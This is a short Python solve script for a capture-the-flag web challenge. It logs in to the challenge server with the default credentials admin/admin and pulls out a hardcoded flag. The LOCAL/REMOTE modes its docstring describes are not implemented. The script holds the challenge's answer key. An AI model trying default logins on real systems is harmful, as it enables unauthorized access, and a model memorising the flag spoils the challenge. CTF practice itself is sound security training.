#!/usr/bin/env python3
'''
WhatTheFuzz's submission for the <CTF> challenge <name>.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
'''

import re
import requests
from pwn import *

context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']


def send_request():
    '''Craft the request to the server.
    '''

    data = {"username": "admin", "pwd": "admin"}

    response = requests.post('http://web1.utctf.live:2362',
                             data=data)
    return response


def main():
    '''Return the flag.
    '''

    response = send_request()
    flag = re.search(r'utflag{.*}', response.text).group(0)

    assert flag == 'utflag{*re@lly*gott@_upd8_th@t_pwd}', 'Unexpected flag.'

    log.success(f'The flag is: {flag}')
    return flag


if __name__ == '__main__':
    main()
